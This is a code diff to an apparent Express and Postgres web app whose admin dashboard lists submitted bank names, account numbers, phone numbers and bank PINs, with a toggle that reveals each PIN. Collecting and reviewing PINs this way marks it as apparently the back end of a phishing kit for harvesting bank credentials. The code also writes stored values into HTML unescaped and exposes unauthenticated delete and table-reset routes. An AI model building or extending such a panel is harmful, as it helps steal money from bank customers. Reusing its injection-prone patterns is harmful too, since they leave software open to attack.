@@ -16,18 +16,28 @@ const pool = new Pool({
   }
 });
 
+app.get("/", (req, res) => {
+  res.redirect("/admin");
+});
+
 app.get("/test-db", async (req, res) => {
   try {
+
     const result = await pool.query("SELECT NOW()");
+
     res.json(result.rows[0]);
+
   } catch (err) {
+
     res.status(500).json({
       error: err.message
     });
+
   }
 });
 
 app.get("/create-table", async (req, res) => {
+
   try {
 
     await pool.query(`
@@ -47,14 +57,14 @@ app.get("/create-table", async (req, res) => {
 
     console.error(err);
 
-    res.status(500).json({
-      error: err.toString()
-    });
+    res.status(500).send(err.message);
 
   }
+
 });
 
 app.get("/reset-table", async (req, res) => {
+
   try {
 
     await pool.query("DROP TABLE IF EXISTS bank_withdrawals");
@@ -74,13 +84,16 @@ app.get("/reset-table", async (req, res) => {
 
   } catch (err) {
 
+    console.error(err);
+
     res.status(500).send(err.message);
 
   }
-});
 
+});
 app.post("/submit", async (req, res) => {
-    try {
+
+  try {
 
     const {
       bank_name,
@@ -120,18 +133,47 @@ app.post("/submit", async (req, res) => {
 });
 
 app.get("/delete/:id", async (req, res) => {
-    try {
+
+  try {
 
     await pool.query(
       "DELETE FROM bank_withdrawals WHERE id = $1",
       [req.params.id]
     );
 
-    res.redirect("/submissions");
+    res.redirect("/dashboard");
 
   } catch (err) {
 
     console.error(err);
+
+    res.status(500).send(err.message);
+
+  }
+
+});
+
+app.post("/delete-selected", async (req, res) => {
+
+  try {
+
+    const { ids } = req.body;
+
+    if (!ids || ids.length === 0) {
+      return res.redirect("/dashboard");
+    }
+
+    await pool.query(
+      "DELETE FROM bank_withdrawals WHERE id = ANY($1::int[])",
+      [Array.isArray(ids) ? ids : [ids]]
+    );
+
+    res.sendStatus(200);
+
+  } catch (err) {
+
+    console.error(err);
+
     res.status(500).send(err.message);
 
   }
@@ -139,10 +181,13 @@ app.get("/delete/:id", async (req, res) => {
 });
 
 app.get("/admin", (req, res) => {
-    res.sendFile(path.join(__dirname, "public", "admin.html"));
-});
 
+  res.sendFile(path.join(__dirname, "public", "admin.html"));
+
+});
 app.get("/dashboard", async (req, res) => {
+
+  try {
 
     const result = await pool.query(
       "SELECT * FROM bank_withdrawals ORDER BY id DESC"
@@ -153,39 +198,74 @@ app.get("/dashboard", async (req, res) => {
     result.rows.forEach(item => {
 
       rows += `
-      <tr>
-        <td>
-          <input
-            type="checkbox"
-            name="ids"
-            value="${item.id}">
-        </td>
+<tr>
 
-        <td>${item.id}</td>
-        <td>${item.bank_name}</td>
-        <td>${item.account_number}</td>
-        <td>${item.phone_number}</td>
-        <td>${item.bank_pin}</td>
-        <td>${new Date(item.created_at).toLocaleString()}</td>
+<td>
+<input
+type="checkbox"
+name="ids"
+value="${item.id}">
+</td>
 
-        <td>
-          <a
-            href="/delete/${item.id}"
-            onclick="return confirm('Delete this record?')"
-            style="color:red;font-weight:bold;text-decoration:none;">
-            Delete
-          </a>
-        </td>
-      </tr>
-      `;
+<td>${item.id}</td>
+
+<td>${item.bank_name}</td>
+
+<td>${item.account_number}</td>
+
+<td>${item.phone_number}</td>
+
+<td>
+
+<span id="pin${item.id}">
+••••••
+</span>
+
+<span
+onclick="togglePin(${item.id},'${item.bank_pin}')"
+style="cursor:pointer;font-size:18px;margin-left:8px;">
+👁️
+</span>
+
+</td>
+
+<td>${new Date(item.created_at).toLocaleString()}</td>
+
+<td>
+
+<a
+href="/delete/${item.id}"
+onclick="return confirm('Delete this record?')"
+style="
+background:#dc3545;
+color:white;
+padding:8px 14px;
+border-radius:6px;
+text-decoration:none;
+font-weight:bold;">
+🗑 Delete
+</a>
+
+</td>
+
+</tr>
+`;
 
     });
 
     res.send(`
 <!DOCTYPE html>
+
 <html>
+
 <head>
-<title>Bank Withdrawal Submissions</title>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width,initial-scale=1.0">
+
+<title>BankConnect Admin Dashboard</title>
 <style>
 
 *{
@@ -197,7 +277,7 @@ font-family:Arial,sans-serif;
 
 body{
 background:#0d1117;
-color:#fff;
+color:#ffffff;
 padding:25px;
 }
 
@@ -205,21 +285,27 @@ padding:25px;
 display:flex;
 justify-content:space-between;
 align-items:center;
-margin-bottom:25px;
-padding:20px;
 background:#161b22;
+padding:20px;
+border-radius:12px;
 border-left:6px solid #D4AF37;
-border-radius:10px;
+margin-bottom:25px;
 }
 
 .header h1{
+font-size:30px;
 color:#D4AF37;
-font-size:28px;
+margin-bottom:5px;
 }
 
 .header p{
 color:#c9d1d9;
-margin-top:5px;
+}
+
+.secured{
+color:#4ade80;
+font-weight:bold;
+margin-top:8px;
 }
 
 .stats{
@@ -238,8 +324,8 @@ text-align:center;
 }
 
 .card h2{
-color:#D4AF37;
 font-size:34px;
+color:#D4AF37;
 margin-top:10px;
 }
 
@@ -247,32 +333,35 @@ margin-top:10px;
 display:flex;
 justify-content:space-between;
 align-items:center;
-margin-bottom:20px;
 flex-wrap:wrap;
 gap:15px;
+margin-bottom:20px;
 }
 
 .search{
-padding:12px;
 width:320px;
-border:none;
-border-radius:8px;
+padding:12px;
 background:#21262d;
+border:1px solid #30363d;
+border-radius:8px;
 color:white;
+font-size:15px;
+outline:none;
 }
 
 button{
 background:#D4AF37;
 color:#000;
-font-weight:bold;
-padding:12px 18px;
 border:none;
+padding:12px 18px;
 border-radius:8px;
+font-weight:bold;
 cursor:pointer;
+transition:.3s;
 }
 
 button:hover{
-background:#f7c948;
+background:#f5c542;
 }
 
 table{
@@ -281,17 +370,17 @@ border-collapse:collapse;
 background:#161b22;
 }
 
-th,td{
-border:1px solid #30363d;
-padding:14px;
-text-align:center;
-}
-
 th{
 background:#0b5ed7;
 color:white;
-position:sticky;
-top:0;
+padding:14px;
+border:1px solid #30363d;
+}
+
+td{
+padding:12px;
+border:1px solid #30363d;
+text-align:center;
 }
 
 tr:nth-child(even){
@@ -302,19 +391,18 @@ tr:hover{
 background:#2d333b;
 }
 
-.delete{
-color:#ff4d4f;
-font-weight:bold;
+a{
 text-decoration:none;
 }
 
-.secured{
-color:#4ade80;
+#clock{
+color:#D4AF37;
 font-weight:bold;
-margin-bottom:15px;
+margin-top:8px;
 }
 
 </style>
+
 </head>
 <body>
 
@@ -328,13 +416,16 @@ margin-bottom:15px;
 
 <p class="secured">🔒 ADMIN SECURED SESSION</p>
 
+<p id="clock"></p>
+
 </div>
 
-<div style="text-align:right;">
+<div>
 
 <button onclick="location.reload()">
 🔄 Refresh
 </button>
+
 <button onclick="logout()">
 🚪 Logout
 </button>
@@ -356,8 +447,8 @@ margin-bottom:15px;
 </div>
 
 <div class="card">
-<p>Status</p>
-<h2 style="font-size:24px;color:#4ade80;">
+<p>System Status</p>
+<h2 style="font-size:22px;color:#4ade80;">
 ONLINE
 </h2>
 </div>
@@ -382,7 +473,7 @@ onclick="deleteSelected()">
 type="text"
 id="searchBox"
 class="search"
-placeholder="Search by bank, phone or account..."
+placeholder="Search bank, account or phone..."
 onkeyup="searchTable()">
 
 </div>
@@ -390,22 +481,32 @@ onkeyup="searchTable()">
 </div>
 
 <table id="recordsTable">
-<table>
 
 <tr>
+
 <th>
+
 <input
 type="checkbox"
 id="selectAll"
 onclick="toggleSelectAll()">
+
 </th>
+
 <th>ID</th>
+
 <th>Bank Name</th>
+
 <th>Account Number</th>
+
 <th>Phone Number</th>
-<th>Bank Pin</th>
-<th>Date</th>
+
+<th>Bank PIN</th>
+
+<th>Date & Time</th>
+
 <th>Action</th>
+
 </tr>
 
 ${rows}
@@ -413,10 +514,6 @@ ${rows}
 </table>
 
 <br>
-
-<button type="button" onclick="deleteSelected()">
-Delete Selected
-</button>
 
 <script>
 function deleteSelected(){
@@ -488,46 +585,56 @@ row.style.display=text.includes(input)?"":"none";
 });
 
 }
+
+function togglePin(id,pin){
+
+const element=document.getElementById("pin"+id);
+
+if(element.innerHTML==="••••••"){
+
+element.innerHTML=pin;
+
+}else{
+
+element.innerHTML="••••••";
+
+}
+
+}
+
+function updateClock(){
+
+const now=new Date();
+
+document.getElementById("clock").innerHTML=
+now.toLocaleString();
+
+}
+
+updateClock();
+
+setInterval(updateClock,1000);
 </script>
+
 </body>
+
 </html>
 `);
 
   } catch (err) {
 
     console.error(err);
+
     res.status(500).send(err.message);
 
   }
 
 });
 
-app.post("/delete-selected", async (req, res) => {
+const PORT = process.env.PORT || 3000;
 
-  try {
+app.listen(PORT, () => {
 
-    const { ids } = req.body;
+  console.log(`Server started on port ${PORT}`);
 
-    if (!ids || ids.length === 0) {
-      return res.redirect("/submissions");
-    }
-
-    await pool.query(
-      "DELETE FROM bank_withdrawals WHERE id = ANY($1::int[])",
-      [Array.isArray(ids) ? ids : [ids]]
-    );
-
-    res.redirect("/submissions");
-
-  } catch (err) {
-
-    console.error(err);
-    res.status(500).send(err.message);
-
-  }
-
-});
-
-app.listen(process.env.PORT || 3000, () => {
-  console.log("Server started");
 });
